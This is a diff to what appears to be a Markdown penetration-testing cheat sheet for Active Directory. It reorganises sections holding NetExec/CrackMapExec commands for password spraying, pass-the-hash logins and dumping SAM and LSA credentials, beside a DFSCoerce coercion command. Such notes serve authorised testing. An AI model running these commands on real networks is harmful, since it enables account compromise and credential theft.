@@ -325,8 +325,8 @@ https://github.com/ohmybahgosh/RockYou2021.txt (91.6 GB)
   sudo python3 dfscoerce.py -d <Domain_Name> -u <AD_user> -p <AD_password> <attacker_IP> <target_IP>
   ```
 </details> 
-  
-# Credential stuff
+
+# Password Spraying
 
 <details>
   <summary> NetExec Password spray </summary> 
@@ -335,8 +335,44 @@ https://github.com/ohmybahgosh/RockYou2021.txt (91.6 GB)
   ```bash
   netexec smb <Domain_Controller_IP> -u users.txt -p <password> --continue-on-success
   ```
+
+</details>
+
+# Authentication
+    
+<details>
+  <summary> NetExec domain authentication </summary> 
   
-  </details>
+  ```bash
+  sudo crackmapexec smb <Domain_Controller_IP> -u <AD_user> -p <AD_password> -H <hash_NT]> 
+  ```
+
+</details> 
+  
+<details>
+  <summary> NetExec local authentication </summary> 
+  
+  ```bash
+  sudo crackmapexec smb <target_IP> -u <username> -H <hash_NT]> --local-auth 
+  ```
+
+</details> 
+
+# Credential dumping
+
+<details>
+  <summary> NetExec local authentication </summary> 
+  
+  ### Dump SAM on local computer
+  ```bash
+  sudo crackmapexec smb <target_IP> -u <username> -H <hash_NT]> --local-auth --sam
+  ```
+  
+   ### Dump LSA on local computer
+  ```bash
+  sudo crackmapexec smb <target_IP> -u <username> -H <hash_NT]> --local-auth --lsa
+  ```
+</details> 
 
 <details>
   <summary> linWinPwn </summary> 
@@ -352,20 +388,6 @@ https://github.com/ohmybahgosh/RockYou2021.txt (91.6 GB)
 ```bash
 sudo ./linWinPwn.sh -t <Domain_Controller_IP> -d <AD_domain> -u <AD_user> -p <AD_password> -H <hash[LM:NT]> -K <kerbticket[./krb5cc_ticket]> -o <output_dir>
 ```
-</details> 
-  
-<details>
-  <summary> CrackMapExec local authentication </summary> 
-  
-  ### Dump SAM on local computer
-  ```bash
-  sudo crackmapexec smb <target_IP> -u <username> -H <hash_NT]> --local-auth --sam
-  ```
-  
-   ### Dump LSA on local computer
-  ```bash
-  sudo crackmapexec smb <target_IP> -u <username> -H <hash_NT]> --local-auth --lsa
-  ```
 </details> 
   
 ## pypykatz
